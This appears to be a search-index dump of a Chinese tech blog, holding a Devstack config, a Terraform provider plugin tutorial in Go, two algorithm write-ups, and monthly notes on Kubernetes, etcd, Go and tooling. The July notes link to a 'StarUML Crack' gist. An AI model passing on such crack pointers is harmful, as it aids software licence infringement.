nodeLOGFILE=/opt/stack/logs/stack.sh.logADMIN_PASSWORD=DATABASE_PASSWORD=RABBIT_PASSWORD=SERVICE_PASSWORD=DATABASE_TYPE=mysqlSERVICE_HOST=10.20.102.37MYSQL_HOST=$SERVICE_HOSTRABBIT_HOST=$SERVICE_HOSTGLANCE_HOSTPORT=$SERVICE_HOST:9292ENABLED_SERVICES=n-cpu,q-agt,n-api-meta,c-vol,placement-clientNOVA_VNC_ENABLED=TrueNOVNCPROXY_URL=&quot;http://$SERVICE_HOST:6080/vnc_auto.html&quot;VNCSERVER_LISTEN=$HOST_IPVNCSERVER_PROXYCLIENT_ADDRESS=$VNCSERVER_LISTENLIBVIRT_TYPE=kvm# Services that a compute node runsENABLED_SERVICES=n-cpu,rabbit,q-agt## Open vSwitch provider networking optionsIP_VERSION=4PHYSICAL_NETWORK=defaultOVS_PHYSICAL_BRIDGE=br-exPUBLIC_INTERFACE=bond1Q_USE_PROVIDER_NETWORKING=True","link":"/hexo-blog/2019/01/07/%E4%BD%BF%E7%94%A8-Devstack-%E6%90%AD%E5%BB%BA-Openstack-%E9%9B%86%E7%BE%A4/"},{"title":"从零开始实现一个 terraform plugin","text":"terraform 作为一个优秀的开源基础设施管理、构建工具，官方或第三方提供了很多 plugin 来对接各种云平台（IaaS）。然而在我们平时开发和测试过程中，需要使用内部的 IaaS 服务频繁创建和删除 VM，而目前人工操作的方式比较费时费力，且没有现成的 plugin 可以使用。为了更方便地利用 terraform 工具来对内部 IaaS 资源进行管理和操作，我们决定自己开发一个 terraform plugin。 定义 Provider Schema首先，我们定义入口文件 main.go： 123456789101112package mainimport ( &quot;github.com/hashicorp/terraform/plugin&quot; qvm &quot;qiniu.com/kirk-deploy/pkg/qvm/terraform&quot;)func main() { plugin.Serve(&amp;plugin.ServeOpts{ ProviderFunc: qvm.Provider, })} 其中 qvm.Provider 函数负责创建一个 provider resource。 12345678910111213141516171819202122232425262728func Provider() terraform.ResourceProvider { return &amp;schema.Provider{ Schema: map[string]*schema.Schema{ &quot;url&quot;: { Type: schema.TypeString, Optional: true, DefaultFunc: schema.EnvDefaultFunc(&quot;QVM_URL&quot;, &quot;&quot;), Description: descriptions[&quot;url&quot;], }, &quot;ak&quot;: { Type: schema.TypeString, Optional: true, DefaultFunc: schema.EnvDefaultFunc(&quot;QVM_AK&quot;, &quot;&quot;), Description: descriptions[&quot;ak&quot;], }, &quot;sk&quot;: { Type: schema.TypeString, Optional: true, DefaultFunc: schema.EnvDefaultFunc(&quot;QVM_SK&quot;, &quot;&quot;), Description: descriptions[&quot;sk&quot;], }, }, ResourcesMap: map[string]*schema.Resource{ &quot;compute_instance&quot;: resourceComputeInstance(), }, ConfigureFunc: configureProvider, }} Schema 声明了 provider 配置文件的定义，对应的 tf 文件这样写： 12345provider qvm { url = &quot;https://qvm.qiniuapi.com&quot; ak = &quot;your app key&quot; sk = &quot;your app secret&quot;} 如果不在 tf 文件里指定 ak 和 sk，则 terraform 会根据 DefaultFunc，从环境变量 QVM_AK 和 QVM_SK 中获取。Optional 代表字段是可选的，即使用户没有填也不会报错。 ResourcesMap 声明了 provider 支持的资源和对应资源的工厂函数，例如这里我们只实现了计算资源，工厂函数的定义我们稍后再解释。 定义 Resource Schema上面提到的 resourceComputeInstance 负责创建一个 compute instance resource，对于计算资源我们可以这样定义： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465func resourceComputeInstance() *schema.Resource { return &amp;schema.Resource{ Create: resourceComputeInstanceCreate, Read: resourceComputeInstanceRead, Update: resourceComputeInstanceUpdate, Delete: resourceComputeInstanceDelete, Timeouts: &amp;schema.ResourceTimeout{ Create: schema.DefaultTimeout(30 * time.Minute), Update: schema.DefaultTimeout(30 * time.Minute), Delete: schema.DefaultTimeout(30 * time.Minute), }, Schema: map[string]*schema.Schema{ &quot;image_id&quot;: { Type: schema.TypeString, Optional: true, ForceNew: true, }, &quot;instance_name&quot;: { Type: schema.TypeString, Optional: true, }, &quot;system_disk&quot;: { Type: schema.TypeList, Required: true, MaxItems: 1, Elem: &amp;schema.Resource{ Schema: map[string]*schema.Schema{ &quot;category&quot;: { Type: schema.TypeString, Optional: true, Default: enums.DiskCategoryCloudEfficiency, ForceNew: true, }, &quot;size&quot;: { Type: schema.TypeInt, Optional: true, Default: 40, }, }, }, }, &quot;data_disk&quot;: { Type: schema.TypeList, Optional: true, MinItems: 1, MaxItems: 15, Elem: &amp;schema.Resource{ Schema: map[string]*schema.Schema{ &quot;category&quot;: { Type: schema.TypeString, Optional: true, Default: enums.DiskCategoryCloudEfficiency, ForceNew: true, }, &quot;size&quot;: { Type: schema.TypeInt, Optional: true, Default: 40, }, }, }, }, }, }} Create Read Update Delete 分别是管理资源的回调函数，terraform 框架会在合适的时间调用这几个函数，Timeouts 定义了每个操作的超时时间，Schema 与上面一样，是定义 tf 文件的具体结构。 ForceNew 代表一旦这个字段改变，则 terraform 会删除并重新创建该资源。TypeList 定义了一个列表，如果 MaxItems: 1 时，列表退化为单个资源。 为了简化起见，Schema 我们省略了很多字段，对应的 tf 文件可以这样写： 12345678910resource &quot;compute_instance&quot; &quot;test&quot; { count = &quot;${var.count}&quot; provider = &quot;qvm&quot; image_id = &quot;${var.image}&quot; instance_name = &quot;${var.instance_name}-${count.index}&quot; system_disk { category = &quot;efficiency&quot; size = 40 }} 其中 ${var.} 代表在 varaibles.tf 文件里定义的变量，具体可以用法可以参考 terraform 官方文档，这里不过多地介绍。 定义 Resource Operation FunctionCreate12345678910111213141516171819202122232425262728293031func resourceComputeInstanceCreate(d *schema.ResourceData, meta interface{}) error { config := meta.(*Config) client, err := config.computeClient() if err != nil { return err } systemDisk := d.Get(&quot;system_disk&quot;).([]interface{})[0].(map[string]interface{}) systemDiskParameters := params.CreateInstanceSystemDiskParameters{ Category: enums.DiskCategory(systemDisk[&quot;category&quot;].(string)), Size: systemDisk[&quot;size&quot;].(int), } parameters := &amp;params.CreateInstanceParameters{ ImageId: d.Get(&quot;image_id&quot;).(string), SystemDisk: systemDiskParameters, InstanceName: enums.InstanceName(d.Get(&quot;instance_name&quot;).(string)), } log.Printf(&quot;[DEBUG] CreateInstanceParameters: %#v&quot;, parameters) rsp, err := client.CreateInstance(parameters) if err != nil { log.Printf(&quot;[ERROR] create instance error, %v&quot;, err) return err } log.Printf(&quot;[INFO] Instance ID: %s&quot;, rsp.Data.InstanceId) d.SetId(rsp.Data.InstanceId) return resourceComputeInstanceRead(d, meta)} Create 的实现最重要的一个操作是 SetId，如果服务端资源创建成功，会返回一个 InstanceId，SetId 会将这个 InstanceId 保存，作为以后判断资源是否更新的 key。 return 前又进行了一次 Read 操作，是为了防止有些状态字段没有通过 CreateResponse 返回，再尝试通过一次 Read 来获取这些状态信息。 Delete123456789101112131415161718func resourceComputeInstanceDelete(d *schema.ResourceData, meta interface{}) error { config := meta.(*Config) client, err := config.computeClient() if err != nil { return err } p := &amp;params.DeleteInstanceParameters{ InstanceId: d.Id(), } _, err = client.DeleteInstance(p) if err != nil { return err } return nil} Update123func resourceComputeInstanceUpdate(d *schema.ResourceData, meta interface{}) error { return resourceComputeInstanceRead(d, meta)} 我们暂时不实现 Update 操作，因此这里只是简单地返回 Read。 Read1234567891011121314151617181920212223func resourceComputeInstanceRead(d *schema.ResourceData, meta interface{}) error { config := meta.(*Config) client, err := config.computeClient() if err != nil { return err } p := &amp;params.DescribeInstanceParameters{ InstanceId: d.Id(), } rsp, err := client.GetInstance(p) if err != nil { return err } instance := &amp;rsp.Data d.Set(&quot;image_id&quot;, instance.ImageId) d.Set(&quot;instance_name&quot;, instance.InstanceName) // ... return nil} Read 通过 InstanceId 对资源状态进行查询，保存至 resource data。 编译和构建上面基本代码框架实现后，我们就可以对 plugin 进行编译和构建了： 1go build -o terraform-provider-qvm 二进制文件的命名必须遵守以下命名规则： 1terraform-provider-&lt;NAME&gt; 构建后，我们手动将二进制拷贝至 terraform 默认的插件目录：${HOME}/.terraform/plguins。 使用进入工作目录，即 tf 文件保存的目录，假设这个目录的结构为： 12345terraform/qvm├── provider.tf├── resources.tf├── variables.tf└── terraform.tfvars 初始化1terraform init 修改配置可以通过 export 或创建 .tfvars 文件，对配置进行修改： 12export QVM_AK=export QVM_SK= 创建 terraform.tfvars 文件： 123instance_name = &quot;&quot;count = 1image = &quot;&quot; 查看更改1terraform plan 执行后 terraform 会对配置进行合法性校验。 应用更改1terraform apply 或者指定 .tfvars 文件： 1terraform apply -var-file=&quot;terraform.tfvars&quot; 销毁1terraform destroy 或者指定 .tfvars 文件： 1terraform destroy -var-file=&quot;terraform.tfvars&quot; 参考https://www.terraform.io/docs/extend/writing-custom-providers.html https://www.terraform.io/docs/extend/how-terraform-works.html","link":"/hexo-blog/2019/05/22/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA-terraform-plugin/"},{"title":"二叉树两个节点之间的最大距离","text":"题目给定一个二叉树，求它两个节点之间的最大距离。 比如二叉树： 12345 1 / \\ 2 3 / \\4 5 的最大距离为 3。 分析刚看到这个题目时有点懵，仔细分析了一下，求根节点为 Root 的二叉树中两个节点的最大距离，需要分两种情况考虑： 情况一如果最大距离经过了 Root，则最大距离： 1MaxDistance(root) = MaxDepth(root.Left) + MaxDepth(root.Right) + 2 假设 root 节点为 1，示例图为： 12345 1 // \\\\ 2 3// \\4 5 情况二如果最大距离没有经过 Root，则最大距离： 1MaxDistance(root) = max(MaxDistance(root.Left), MaxDistance(root.Right)) 假设 root 节点为 1，示例图为： 1234567 1 / 2 // \\\\ 3 4// \\\\5 6 想必大家已经通过公式看出规律来了，父节点的 maxDistance 可以通过两个子节点的 maxDistance 和 maxDepth 求出，合并 1 2 两种情况，最终的状态转移方程如下： 1MaxDistance(root) = max(max(MaxDistance(root.Left), MaxDistance(root.Right)), MaxDepth(root.Left) + MaxDepth(root.Right) + 2) 实现我们需要有个数据结构保存中间结果，即 maxDepth 和 maxDistance。 另外，这里我们确定 root 节点的深度为 0，因此将 nil 节点的深度初始化为 -1。 整个算法使用了递归方式。 123456789101112131415161718192021222324252627282930313233type TreeNode struct { Val int Left *TreeNode Right *TreeNode}type result struct { maxDepth int maxDistance int}func getMaxDistance(root *TreeNode) *result { if root == nil { return &amp;result{ maxDepth: -1, maxDistance: 0, } } left := getMaxDistance(root.Left) right := getMaxDistance(root.Right) maxDepth := max(left.maxDepth+1, right.maxDepth+1) maxDistance := max(max(left.maxDistance, right.maxDistance), left.maxDepth+right.maxDepth+2) return &amp;result{ maxDepth: maxDepth, maxDistance: maxDistance, }}func GetMaxDistance(root *TreeNode) int { result := getMaxDistance(root) return result.maxDistance} 可以在这里在线运行：https://play.golang.org/p/CwIvHaBJwP-","link":"/hexo-blog/2019/05/23/%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%A4%E4%B8%AA%E8%8A%82%E7%82%B9%E4%B9%8B%E9%97%B4%E7%9A%84%E6%9C%80%E5%A4%A7%E8%B7%9D%E7%A6%BB/"},{"title":"有序数组的不同绝对值个数","text":"题目给定一个有序数组，求它的元素不同的绝对值个数。 比如 1[-3, -1, 0, 0, 1, 1, 2, 5] 返回 15 分析第一种方法首先一个循环将数组所有的负数转换为正数，然后对整个数组进行排序。 但循环一遍的时间复杂度为 O(n)，排序如果用堆排序，平均时间复杂度为 O(nlogn)，空间复杂度为 O(1)。因此整体的时间复杂度为 O(nlogn)，空间复杂度为 O(1)。而既然题目已经保证了有序数组，那有没有更快的方法呢？ 第二种方法我们可以用两个索引，索引 i 和 索引 j 分别从数组两端向中间移动，如果当前元素和下一个元素相等则跳过，如果右边的绝对值大于左边的绝对值，则索引 j 左移，如果左边的绝对值大于右边的绝对值，则索引 i 右移，如果两边绝对值相等，则索引同时左移和右移，每次移动计数加一。直到索引相遇时结束，如果相遇后索引刚好相等，则计数最后再加一。 这样时间复杂度就为 O(n)，空间复杂度为 O(1)。 实现使用 Golang 实现的源码如下： 123456789101112131415161718192021222324252627282930313233343536func getDistinctAbsCount(nums []int) int { i := 0 j := len(nums) - 1 count := 0 for i &lt; j { if i &lt; len(nums)-1 &amp;&amp; nums[i] == nums[i+1] { // skip duplicated i += 1 continue } if j &gt; 0 &amp;&amp; nums[j] == nums[j-1] { // skip duplicated j -= 1 continue } sum := nums[i] + nums[j] if sum &gt; 0 { // abs(nums[i]) &lt; abs(nums[j]) j -= 1 } else if sum &lt; 0 { // abs(nums[i]) &gt; abs(nums[j]) i += 1 } else { // abs(nums[i]) == abs(nums[j]) i += 1 j -= 1 } count += 1 } if i == j { count += 1 } return count} 可在这里在线运行：https://play.golang.org/p/lmOI5ZNkMNf","link":"/hexo-blog/2019/05/23/%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84%E7%9A%84%E4%B8%8D%E5%90%8C%E7%BB%9D%E5%AF%B9%E5%80%BC%E4%B8%AA%E6%95%B0/"},{"title":"2019 年 7 月手记","text":"Kubernetesapi conventionshttps://github.com/kubernetes/community/blob/master/contributors/devel/sig-architecture/api-conventions.md kube node leasekube node lease 用来改善 kubelet 定时更新节点状态对 etcd 造成的压力。 https://containers.goffinet.org/k8s/kubectlget.html#what-about-kube-node-lease https://github.com/kubernetes/enhancements/blob/master/keps/sig-node/0009-node-heartbeat.md https://kubernetes.io/docs/concepts/architecture/nodes/#node-controller https://github.com/kubernetes-sigs/kubespray/blob/master/docs/kubernetes-reliability.md Finalizershttps://book-v1.book.kubebuilder.io/beyond_basics/using_finalizers.html controller historyControllerRevision 是为 StatefulSet 和 DaemonSet 保存历史的资源类型。因为设计得比较通用，第三方控制器 + CRD 也可以借助它来实现版本管理。 client-go informerhttps://github.com/kubernetes/sample-controller/blob/master/docs/controller-client-go.md kubebuilderkubebuilder 是开发第三方 controller 或 operator 的代码框架生成工具。它的实现基于 controller-runtime 这个项目。 Create Kubernetes Cluster使用 kubeadm 快速搭建一个可用的开发集群： Install Container Runtimes Get Docker CE for Ubuntu Install kubeadm Create Cluster Install CNI Plugin 1kubectl apply -f https://docs.projectcalico.org/v3.8/manifests/calico.yaml KubeCon 2019 Videoshttps://www.youtube.com/watch?v=5yKheFRMflQ&amp;list=PLj6h78yzYM2Njj5PvNc4Mtcril2YyR95d 阿里技术基于多租户的虚拟集群https://drive.google.com/file/d/1DX3jBwueEpSRhJ6n3VcqS1S3GDVvhF1B/view https://docs.google.com/document/d/1EELeVaduYZ65j4AXg9bp3Kyn38GKDU5fAJ5LFcxt2ZU/edit 容器迁移“迁移策略+新容器运行时”应对有状态应用的冷热迁移挑战 CRIContainer runtimes: clarity Container Runtime Interface (CRI) CLI CRICTL User Guide StorageFlex Volumehttps://github.com/kubernetes/community/blob/master/contributors/devel/sig-storage/flexvolume.md https://github.com/kubernetes/community/blob/master/contributors/design-proposals/storage/flexvolume-deployment.md CSIhttps://github.com/kubernetes/community/blob/master/contributors/design-proposals/storage/container-storage-interface.md Kubernetes Handbookhttps://jimmysong.io/kubernetes-handbook/ Kubernetes testinghttps://jimmysong.io/kubernetes-handbook/develop/testing.html https://github.com/kubernetes/community/blob/master/contributors/devel/sig-testing/testing.md integration testinghttps://github.com/kubernetes/community/blob/master/contributors/devel/sig-testing/integration-tests.md e2e testinghttps://kubernetes.io/blog/2019/03/22/kubernetes-end-to-end-testing-for-everyone/ https://github.com/kubernetes/community/blob/master/contributors/devel/sig-testing/e2e-tests.md https://github.com/kubernetes/community/blob/master/contributors/devel/sig-testing/writing-good-e2e-tests.md https://www.cnblogs.com/jinsdu/p/7465434.html https://github.com/onsi/ginkgo http://onsi.github.io/ginkgo/ https://github.com/kubernetes/community/blob/master/contributors/devel/sig-architecture/conformance-tests.md 可以参考的项目 local-static-provisioner kubernetes kruise prometheus-operator deletion and garbage collection这篇文章 介绍了 kubernetes 的删除和垃圾回收机制。 ingresshttps://traefik.io/ Useful Commands查看 control-plane 状态123kubectl get componentstatuskubectl get cskubectl cluster-info ContainerRunC 简介RunC 简介 docker registry self-signed certificates自建 docker registry 自签名方法： https://docs.docker.com/registry/insecure/ 容器安全性Running Docker Containers as Current Host User Useful Commandsdebug container通过以下命令可以很方便的调试容器网络： 1sudo nsenter -t &lt;container-pid&gt; -n ip addr start mongodb locally1docker run -p 27017:27017 -v $PWD/db:/data/db -d mongo:3.2 Golanggo modules (vgo)go modules 已经逐渐取代其他依赖管理工具，很多社区项目都在逐步向 go modules 迁移。 What are Go modules and how do I use them? Go Modules使用教程 Go Modules 内部分享 go modules with kubernetes 的坑使用 go modules 导入 k8s.io/kubernetes 主库会有问题，因为主库的 go.mod 文件里 replace 了一大堆依赖，官方给的建议 是在自己的 go.mod 文件里再次 replace 会正确的版本，或者干脆不要依赖主库。 golang 内存逃逸Go 内存逃逸详细分析 golang 测试测试、性能测试以及代码示例的编写 Package test ProductiveStarUML Crackhttps://gist.github.com/trandaison/40b1d83618ae8e3d2da59df8c395093a#gistcomment-2723165 Dictionary Extension用 DictUnifier（已改名为 mac-dictionary-kit）可以将 stardict 词典格式转换为 Apple Dict 格式。 转换教程参考： https://www.douban.com/group/topic/9591106/ https://github.com/tsoliangwu0130/my-macos/blob/master/misc/dictunifier-stardict.md PyGlossary 是另外一种词典转换工具，不过需要在 Apple Developer Downloads 单独下载 Additional Tools for Xcode. 词典转换后可能会有 css 显示问题，可以参考： https://discussions.apple.com/thread/3736067 禁用 .DS_Store如果在 macOS 的 Finder 里访问网络文件系统（比如 samba），打开目录是会自动在目录下生成 .DS_Store 来存储一些元信息（标签、文件夹颜色、排序等等），这个在其他系统上看起来就非常不顺眼，因此可以通过下面的命令禁用： 1defaults write com.apple.desktopservices DSDontWriteNetworkStores true 但是这个命令只对网络存储有用，对于本地磁盘还是会生成 .DS_Store 文件，暂时没有方便的办法禁用。 Jetbrains back/forward with mouse有的鼠标有 Button4 和 Button5 可以在浏览代码时很方便地前进和后退，macOS 系统，在 Visual Studio Code 上正常，但在 Jetbrains 系的 IDE 上默认却是跳转到行首和行尾，解决方法是修改 Button4 和 Button5 默认的键盘快捷键。可以参考这个方法修改。 Vagrant + KVMKVM 比 VirtualBox 的性能更好，在 Linux 环境下推荐使用： https://medium.com/@gauthierleonard/kvm-machines-for-vagrant-on-archlinux-1d8863344cb7 https://docs.cumulusnetworks.com/display/VX/Vagrant+and+Libvirt+with+KVM+or+QEMU https://gist.github.com/yuanying/924ce2ce61b75ab818b5 Windows 10 + Ubuntu 18.04在 MacOS 上刻录镜像 https://www.cybrary.it/0p3n/macos-terminal-create-bootable-usb-iso-using-dd/ Ubuntu Installer 无法识别 GPT 分区 https://arstechnica.com/civis/viewtopic.php?p=36107737&amp;sid=108632491878b9fa937dcbc6d433765f#p36107737 https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/disabling-secure-boot https://www.technorms.com/45538/disable-enable-secure-boot-asus-motherboard-uefi-bios-utility NVMe 安装 Ubuntu https://ubuntuforums.org/showthread.php?t=2390475 https://ubuntu-mate.community/t/cant-see-nvme-m-2-drive-for-fresh-install/18463/3 VSC Remote使用 VSC Remote 可以方便地在 Windows 或者 macOS 下利用 ssh 进行 Linux 环境远程开发和调试。需要安装 Visual Studio Code insiders 版本。 Gitchange author of commitshttps://makandracards.com/makandra/1717-git-change-author-of-a-commit grep logs有时候需要确认某个 PR 或者 commit 有没有合入特定版本或者分支，可以用下面的命令： 1git log &lt;branch-or-tag-name&gt; --since 3.weeks --grep &lt;pattern&gt; git status 显示 UTF-8 字符1git config --global core.quotepath false git status 显示中文和解决中文乱码 BazelBazel 是 Google 的构建工具，CMake 或者 Makefile 的替代品。 https://medium.com/windmill-engineering/bazel-is-the-worst-build-system-except-for-all-the-others-b369396a9e26 jqjson 的命令行解析工具。参考：https://stedolan.github.io/jq/tutorial/ ShellThe Bash Hackers Wiki Others服务名与端口号映射https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml Flinkhttps://segmentfault.com/a/1190000016901447 https://flink.apache.org/ CSS一个学习 css 的网站，支持边学边练：https://developer.mozilla.org/en-US/docs/Web/CSS/white-space","link":"/hexo-blog/2019/07/19/2019-%E5%B9%B4-7-%E6%9C%88%E6%89%8B%E8%AE%B0/"},{"title":"2019 年 8 月手记","text":"Kubernetesobject GroupVersionKind is empty问题从 client-go （无论是从 server 还是 cache）获取到的 object 的 TypeMeta 为空 123pod := podLister.Pods(namespace).Get(name)gvk := pod.GetObjectKind().GroupVersionKind()fmt.Printf(&quot;%#v\\n&quot;, gvk) 1GroupVersionKind{Group:&quot;&quot;, Version:&quot;&quot;, Kind:&quot;&quot;} (kubernetes 1.14) 原因https://github.com/kubernetes/client-go/issues/308#issuecomment-378165425 https://github.com/kubernetes/kubernetes/pull/59264#issuecomment-362575608 https://github.com/kubernetes/apiextensions-apiserver/issues/29#issuecomment-378057230 解决在需要 GVK 的地方，需要和 object 一起显式传入 controller-runtime 框架从 cache 中获取到对象之后设置了 GVK https://github.com/kubernetes-sigs/controller-runtime/pull/212 https://github.com/kubernetes-sigs/controller-runtime/pull/389 kubernetes PATCH operations这篇文档介绍了 kubernetes PATCH 操作的三种策略： https://github.com/kubernetes/kubernetes/blob/release-1.1/docs/devel/api-conventions.md#patch-operations json patch json merge patch 是 json patch 的简化版 strategic merge patch 这篇文档介绍了 kubectl apply 的原理，比如如何通过 patchMergeKey 计算资源的改动，如何通过 strategic merge patch 更新资源： https://kubernetes.io/docs/tasks/manage-kubernetes-objects/declarative-config/ 这两篇文章分别介绍了如何通过 PATCH API 和 kubectl patch 对资源进行修改操作： https://dwmkerr.com/patching-kubernetes-resources-in-golang/ https://kubernetes.io/docs/tasks/run-application/update-api-object-kubectl-patch/#notes-on-the-strategic-merge-patch daemonset 调度问题https://github.com/kubernetes/enhancements/issues/548 https://docs.google.com/document/d/10Ch3dhD88mnHYTq9q4jtX3e9e6gpndC78g5Ea6q4JY4/edit# https://docs.google.com/document/d/1v7hsusMaeImQrOagktQb40ePbK6Jxp1hzgFB9OZa_ew/edit# node 从资源不足变为满足条件时，daemonset controller 感知不到 https://github.com/kubernetes/kubernetes/issues/46935 https://github.com/kubernetes/kubernetes/issues/45628 webhookhttps://medium.com/ibm-cloud/diving-into-kubernetes-mutatingadmissionwebhook-6ef3c5695f74 https://github.com/morvencao/kube-mutating-webhook-tutorial base imagehttps://github.com/kubernetes/kubernetes/issues/70249 https://github.com/kubernetes/enhancements/blob/master/keps/sig-release/20190316-rebase-images-to-distroless.md https://github.com/kubernetes/sig-release/blob/master/release-engineering/baseimage-exception-list.md ciliumhttps://cilium.io/blog/2019/08/20/cilium-16 kubectl source codehttps://developer.ibm.com/opentech/2017/06/21/tour-kubernetes-source-code-part-one-kubectl-api-server/ Productiveiterm2 rz szhttps://segmentfault.com/a/1190000012166969 Proxy 配置https://github.com/shadowsocks/shadowsocks/wiki/Convert-Shadowsocks-into-an-HTTP-proxy Golangcgohttps://blog.golang.org/c-go-cgo https://golang.org/cmd/cgo/ https://golang.org/src/cmd/cgo/doc.go https://dave.cheney.net/tag/cgo https://dominik.honnef.co/posts/2015/06/statically_compiled_go_programs__always__even_with_cgo__using_musl/ Othersbrafthttps://github.com/brpc/braft/blob/master/docs/cn/overview.md tcp delayed ackhttps://serverfault.com/questions/834326/questions-about-nagle-vs-delayed-ack","link":"/hexo-blog/2019/08/01/2019-%E5%B9%B4-8-%E6%9C%88%E6%89%8B%E8%AE%B0/"},{"title":"2019 年 9 月手记","text":"Kuberneteskubernetes 生产环境性能优化https://caicloud.io/blog/57392eca8241681100000003 容器内信息注入https://kubernetes.io/docs/concepts/storage/volumes/#using-subpath-with-expanded-environment-variables https://kubernetes.io/docs/tasks/inject-data-application/downward-api-volume-expose-pod-information/#capabilities-of-the-downward-api kubernetes schedulerhttps://ggaaooppeenngg.github.io/zh-CN/2017/09/26/kubernetes-%E6%8C%87%E5%8C%97/ https://caicloud.io/blog/57392eca8241681100000003 https://coreos.com/blog/improving-kubernetes-scheduler-performance.html kubernetes cpu managerhttps://github.com/kubernetes/kubernetes/issues/67577 https://kubernetes.io/blog/2018/07/24/feature-highlight-cpu-manager/ https://cloud.tencent.com/developer/article/1402119 https://git.kernel.org/pub/scm/linux/kernel/git/tip/tip.git/commit/?id=de53fd7aedb100f03e5d2231cfce0e4993282425 https://bugzilla.kernel.org/show_bug.cgi?id=198197 https://gist.github.com/bobrik/2030ff040fad360327a5fab7a09c4ff1 https://github.com/kubernetes/community/blob/master/contributors/design-proposals/node/cpu-manager.md https://www.slideshare.net/try_except_/ensuring-kubernetes-cost-efficiency-across-many-clusters-devops-gathering-2019 https://github.com/kubernetes/kubernetes/issues/66614 https://github.com/opencontainers/runc/issues/1635 https://twitter.com/try_except_/status/1131459031376252928 https://www.slideshare.net/try_except_/ensuring-kubernetes-cost-efficiency-across-many-clusters-devops-gathering-2019 debug kubernetes service排查 kubernetes service 问题的步骤： https://kubernetes.io/docs/tasks/debug-application-cluster/debug-service/#does-the-service-work-by-ip 关于容器内 sysctl 的问题https://github.com/kubernetes/community/blob/master/contributors/design-proposals/node/sysctl.md https://github.com/kubernetes/kubernetes/issues/29572#issuecomment-236193826 https://www.kernel.org/doc/Documentation/networking/ip-sysctl.txt https://kubernetes.io/docs/tasks/configure-pod-container/security-context/ https://github.com/moby/moby/issues/4611 https://github.com/moby/moby/issues/35993 docker镜像 sha256 地址根据镜像的 id 获取 sha256 地址： 1docker image inspect --format='{{index .RepoDigests 0}}' ${IMAGE} 根据镜像的 sha256 地址拉取镜像： 1docker pull ubuntu@sha256:45b23dee08af5e43a7fea6c4cf9c25ccf269ee113168c19722f87876677c5cb2 Linuxexit code 和 signal 的对应关系1signal = exit code - 128 1234567891011121314kill -l 1) SIGHUP 2) SIGINT 3) SIGQUIT 4) SIGILL 5) SIGTRAP 6) SIGABRT 7) SIGEMT 8) SIGFPE 9) SIGKILL 10) SIGBUS 11) SIGSEGV 12) SIGSYS13) SIGPIPE 14) SIGALRM 15) SIGTERM 16) SIGUSR117) SIGUSR2 18) SIGCHLD 19) SIGPWR 20) SIGWINCH21) SIGURG 22) SIGIO 23) SIGSTOP 24) SIGTSTP25) SIGCONT 26) SIGTTIN 27) SIGTTOU 28) SIGVTALRM29) SIGPROF 30) SIGXCPU 31) SIGXFSZ 32) SIGWAITING33) SIGLWP 34) SIGFREEZE 35) SIGTHAW 36) SIGCANCEL37) SIGLOST 38) SIGXRES 41) SIGRTMIN 42) SIGRTMIN+143) SIGRTMIN+2 44) SIGRTMIN+3 45) SIGRTMAX-3 46) SIGRTMAX-247) SIGRTMAX-1 48) SIGRTMAX https://stackoverflow.com/questions/23098695/strange-return-value-134-to-call-gawk-in-bash-script 更详细的关于 linux exit code 的介绍： http://www.tldp.org/LDP/abs/html/exitcodes.html shell 学习https://github.com/jlevy/the-art-of-command-line/blob/master/README-zh.md https://explainshell.com/ https://github.com/dylanaraps/pure-sh-bible Advanced Bash-Scripting Guidehttps://www.tldp.org/LDP/abs/html/index.html Golang一个用 golang 实现的执行 cron 定时任务的库https://github.com/robfig/cron Testing Your (HTTP) Handlers in Gohttps://blog.questionable.services/article/testing-http-handlers-go/","link":"/hexo-blog/2019/09/03/2019-%E5%B9%B4-9-%E6%9C%88%E6%89%8B%E8%AE%B0/"},{"title":"2019 年 10 月手记","text":"Kubernetesetcd 运维文档https://github.com/etcd-io/etcd/blob/master/Documentation/op-guide/maintenance.md etcd 压测不断写入同一个 key，产生大量 revision。可以通过 compact 和 defrag 解决。 1234while [ 1 ]; do dd if=/dev/urandom bs=1024 count=1024 | ETCDCTL_API=3 ./etcdctl --endpoints=https://10.0.2.15:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key put /test || breakdone 写入不同的 key。通过删除 key 解决。 123for j in {1..10}; do dd if=/dev/urandom bs=1024 count=1024 | ETCDCTL_API=3 ./etcdctl --endpoints=https://10.0.2.15:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key put /test/key/${j} || breakdone node shutdown KEP提出了一种安全处理节点宕机或节点重启时，有状态服务故障自动恢复的方案： https://github.com/kubernetes/enhancements/pull/1116/files cloud controller manager自定义 cloud controller manager 的实现： https://kubernetes.io/docs/tasks/administer-cluster/running-cloud-controller/ https://kubernetes.io/docs/tasks/administer-cluster/developing-cloud-controller-manager/ pod disruption budget 简介https://kubernetes.io/docs/tasks/run-application/configure-pdb/ kubetesthttps://github.com/vapor-ware/kubetest https://kubetest.readthedocs.io/en/latest/index.html KVMKVM 各种管理工具https://www.linux-kvm.org/page/Management_Tools KVM cloud image 的使用https://serverascode.com/2018/06/26/using-cloud-images.html Golanggolang flaghttps://medium.com/what-i-talk-about-when-i-talk-about-technology/dealing-with-command-line-options-in-golang-flag-package-e5fb6ef1a79e https://blog.rapid7.com/2016/08/04/build-a-simple-cli-tool-with-golang/ ProductiveProxy将 gfwlist 转换为 privoxy 配置： https://github.com/snachx/gfwlist2privoxy 1pip install gfwlist2privoxy 1gfwlist2privoxy -f gfwlist.action -p 127.0.0.1:1080 -t socks5t /etc/privoxy/config actionsfile gfwlist.action inletshttps://github.com/inlets/inletshttps://blog.alexellis.io/https-inlets-local-endpoints/ Otherszookeeperhttps://www.cnblogs.com/sunddenly/p/4143306.html https://zhukeyao.wordpress.com/2016/11/15/understanding-paxosraftzab-algorithm/ HepollC ServerHepollC Server 是以C语言开发的单进程异步高性能 http 服务器框架，实现了 PostgreSQL、Oracle 异步调用，异步 http(s)客户端，array、dict 等数据结构，以共享库形式实现灵活扩展。 http://www.1hua.top/hepollc.html Hux 